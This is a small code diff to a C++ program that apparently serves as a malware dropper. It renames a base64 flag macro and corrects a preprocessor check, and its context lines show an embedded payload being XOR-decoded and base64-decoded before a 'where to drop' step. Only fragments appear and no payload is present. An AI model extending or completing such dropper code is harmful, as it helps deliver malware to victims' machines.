@@ -10,7 +10,7 @@
 #endif
 
 #ifndef DROPPER_BASE64
-#define DROPPER_BASE64 false
+#define DROPPER_BASE64 0
 #endif
 
 #include<iostream>
@@ -81,10 +81,9 @@ int main(int argc, char* argv[])
 		data = XOR(data, size);
 	#endif
 
-	#if BASE64 == false
+	#if DROPPER_BASE64 == 0
 		std::cout << "Base64 has been run!\n";
 		data = base64decode(data, &size);
-
 	#endif
 	// where to drop
 	set_name();
